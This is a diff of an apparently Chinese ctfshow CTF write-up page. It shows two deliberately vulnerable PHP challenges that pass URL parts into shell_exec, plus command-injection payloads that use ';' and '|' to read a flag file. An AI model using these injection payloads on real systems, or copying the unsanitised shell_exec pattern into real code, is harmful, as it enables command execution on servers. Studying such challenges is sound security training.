@@ -27,7 +27,7 @@
 <meta property="og:description" content="ctfshow SSTI 与过滤绕过：关键字、字符与长度限制。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-10-05T02:00:00.000Z">
-<meta property="article:modified_time" content="2026-11-27T07:41:34.968Z">
+<meta property="article:modified_time" content="2026-11-27T07:56:30.472Z">
 <meta property="article:author" content="Xendr1a">
 <meta property="article:tag" content="SSTI">
 <meta property="article:tag" content="ctfshow">
@@ -431,7 +431,7 @@
 
 <h3 id="web397"><a href="#web397" class="headerlink" title="web397"></a>web397</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>if(isset($_GET[&#x27;url&#x27;]))&#123;<br>    $url = parse_url($_GET[&#x27;url&#x27;]);<br>    shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);<br><br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>一样能用 <code>?url=127.0.0.1/1;cat fl0g.php &amp;gt; 1.txt</code></p>
+<p>一样能用 <code>?url=127.0.0.1/1;cat fl0g.php &gt; 1.txt</code></p>
 <h3 id="web398"><a href="#web398" class="headerlink" title="web398"></a>web398</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>if(isset($_GET[&#x27;url&#x27;]))&#123;<br>    $url = parse_url($_GET[&#x27;url&#x27;]);<br>    if(!preg_match(&#x27;/;/&#x27;, $url[&#x27;host&#x27;]))&#123;<br>        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);<br>    &#125;<br><br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">过滤了;   <br>我们还能用|<br>?url=127.0.0.1/1|cat fl0g.php &gt; 1.txt<br></code></pre></td></tr></table></figure>
